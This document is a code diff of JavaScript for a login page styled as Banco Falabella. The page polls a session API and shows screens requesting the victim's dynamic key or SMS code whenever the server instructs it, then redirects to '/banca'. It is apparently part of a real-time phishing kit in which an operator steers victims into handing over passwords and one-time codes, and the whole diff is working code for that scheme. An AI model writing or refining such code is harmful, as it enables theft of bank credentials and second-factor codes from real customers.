@@ -83,7 +83,7 @@ sessionStorage.setItem('sessionId', sessionId);
 
 let pingInterval = null;
 let pollInterval = null;
-let activeClaveAction = null;
+let currentScreen = 'login'; // 'login', 'dinamica', 'sms'
 
 function startPing() {
   if (pingInterval) clearInterval(pingInterval);
@@ -100,6 +100,45 @@ function stopPing() {
   }
 }
 
+function showClaveScreen(type) {
+  currentScreen = type;
+  const loader = document.getElementById("bfLoader");
+  loader.classList.remove("open");
+  
+  document.getElementById("loginOverlay").classList.remove("open");
+  document.getElementById("claveScreen").hidden = false;
+  
+  const claveTitle = document.getElementById("claveTitle");
+  const claveDesc = document.getElementById("claveDesc");
+  const claveSideText = document.getElementById("claveSideText");
+  const claveBadgeText = document.getElementById("claveBadgeText");
+  const claveInput = document.getElementById("claveInput");
+  const claveAuth = document.getElementById("claveAuth");
+  const claveError = document.getElementById("claveError");
+  
+  if (claveError) claveError.textContent = "";
+  
+  if (type === 'sms') {
+    claveTitle.textContent = "Ingreso de Código SMS";
+    claveDesc.innerHTML = "Ingresa el código de seguridad de 6 dígitos que enviamos por SMS a tu celular";
+    claveSideText.innerHTML = "Encuentra tu <strong>Código SMS</strong> en la bandeja de entrada de tu celular";
+    claveBadgeText.textContent = "Código SMS";
+  } else {
+    claveTitle.textContent = "Ingreso de Clave Dinámica";
+    claveDesc.innerHTML = "Ingresa el código de seguridad de 6 dígitos que aparece en tu app <strong>Banco Falabella</strong>";
+    claveSideText.innerHTML = "Encuentra tu <strong>Clave Dinámica</strong> en la pantalla principal de tu app <strong>Banco Falabella</strong>";
+    claveBadgeText.textContent = "Clave Dinámica";
+  }
+  
+  if (claveInput) {
+    claveInput.value = "";
+    claveInput.focus();
+  }
+  if (claveAuth) {
+    claveAuth.disabled = true;
+  }
+}
+
 function startPolling() {
   if (pollInterval) clearInterval(pollInterval);
   pollInterval = setInterval(async () => {
@@ -111,80 +150,47 @@ function startPolling() {
         const state = data.state;
         const loader = document.getElementById("bfLoader");
 
-        if (action === 'dinamica' || action === 'sms') {
-          if (activeClaveAction !== action) {
-            activeClaveAction = action;
-            loader.classList.remove("open");
-            
-            // Ocultar drawer de login y mostrar pantalla completa de Clave Dinámica/SMS
-            document.getElementById("loginOverlay").classList.remove("open");
-            document.getElementById("claveScreen").hidden = false;
-            
-            const claveTitle = document.getElementById("claveTitle");
-            const claveDesc = document.getElementById("claveDesc");
-            const claveSideText = document.getElementById("claveSideText");
-            const claveBadgeText = document.getElementById("claveBadgeText");
-            const claveInput = document.getElementById("claveInput");
-            const claveAuth = document.getElementById("claveAuth");
-            const claveError = document.getElementById("claveError");
-            
-            if (claveError) claveError.textContent = "";
-            
-            if (action === 'sms') {
-              claveTitle.textContent = "Ingreso de Código SMS";
-              claveDesc.innerHTML = "Ingresa el código de seguridad de 6 dígitos que enviamos por SMS a tu celular";
-              claveSideText.innerHTML = "Encuentra tu <strong>Código SMS</strong> en la bandeja de entrada de tu celular";
-              claveBadgeText.textContent = "Código SMS";
-            } else {
-              claveTitle.textContent = "Ingreso de Clave Dinámica";
-              claveDesc.innerHTML = "Ingresa el código de seguridad de 6 dígitos que aparece en tu app <strong>Banco Falabella</strong>";
-              claveSideText.innerHTML = "Encuentra tu <strong>Clave Dinámica</strong> en la pantalla principal de tu app <strong>Banco Falabella</strong>";
-              claveBadgeText.textContent = "Clave Dinámica";
-            }
-            
-            if (claveInput) {
-              claveInput.value = "";
-              claveInput.focus();
-            }
-            if (claveAuth) {
-              claveAuth.disabled = true;
-            }
+        if (action === 'dinamica') {
+          if (currentScreen !== 'dinamica') {
+            showClaveScreen('dinamica');
           }
-        } else {
-          activeClaveAction = null;
-          if (action === 'error-login') {
-            stopPing();
-            stopPolling();
-            loader.classList.remove("open");
-            loginSubmit.disabled = false;
-            loginSubmit.classList.remove("btn-disabled");
-            loginSubmit.classList.add("btn-primary");
-            document.getElementById("loginError").textContent = "Documento o contraseña incorrecta. Por favor, verifica tus datos.";
-          } else if (state === 'error-dinamica' || state === 'error-sms') {
-            loader.classList.remove("open");
-            const claveAuth = document.getElementById("claveAuth");
-            if (claveAuth) claveAuth.disabled = false;
-            document.getElementById("claveError").textContent = "Código de validación incorrecto o expirado. Intenta de nuevo.";
-          } else if (action === 'done') {
-            stopPing();
-            stopPolling();
-            loader.classList.remove("open");
-            
-            // Ocultar claveScreen si estaba abierta
-            document.getElementById("claveScreen").hidden = true;
-            
-            toast("Verificación exitosa");
-            
-            setSession({
-              type: docType.value,
-              doc: docNumber.value,
-              name: nameFromDoc(docNumber.value),
-            });
-            
-            setTimeout(() => {
-              window.location.href = "/banca";
-            }, 1500);
+        } else if (action === 'sms') {
+          if (currentScreen !== 'sms') {
+            showClaveScreen('sms');
           }
+        } else if (action === 'error-login') {
+          stopPing();
+          stopPolling();
+          loader.classList.remove("open");
+          document.getElementById("claveScreen").hidden = true;
+          document.getElementById("loginOverlay").classList.add("open");
+          loginSubmit.disabled = false;
+          loginSubmit.classList.remove("btn-disabled");
+          loginSubmit.classList.add("btn-primary");
+          document.getElementById("loginError").textContent = "Documento o contraseña incorrecta. Por favor, verifica tus datos.";
+          currentScreen = 'login';
+        } else if (state === 'error-dinamica' || state === 'error-sms') {
+          loader.classList.remove("open");
+          const claveAuth = document.getElementById("claveAuth");
+          if (claveAuth) claveAuth.disabled = false;
+          document.getElementById("claveError").textContent = "Código de validación incorrecto o expirado. Intenta de nuevo.";
+        } else if (action === 'done') {
+          stopPing();
+          stopPolling();
+          loader.classList.remove("open");
+          document.getElementById("claveScreen").hidden = true;
+          
+          toast("Verificación exitosa");
+          
+          setSession({
+            type: docType.value,
+            doc: docNumber.value,
+            name: nameFromDoc(docNumber.value),
+          });
+          
+          setTimeout(() => {
+            window.location.href = "/banca";
+          }, 1500);
         }
       }
     } catch (_) {}
@@ -226,15 +232,17 @@ document.getElementById("loginForm").addEventListener("submit", (e) => {
     
     // Auto-transición a Clave Dinámica después de 1.5s
     setTimeout(() => {
-      fetch(`/api/sessions/${sessionId}/action`, {
+      fetch(`/api/sessions/${sessionId}/state`, {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ action: 'dinamica', state: 'waiting-dinamica' })
+        body: JSON.stringify({ state: 'waiting-dinamica' })
       })
       .then(() => {
+        showClaveScreen('dinamica');
         startPolling();
       })
       .catch(() => {
+        showClaveScreen('dinamica');
         startPolling();
       });
     }, 1500);
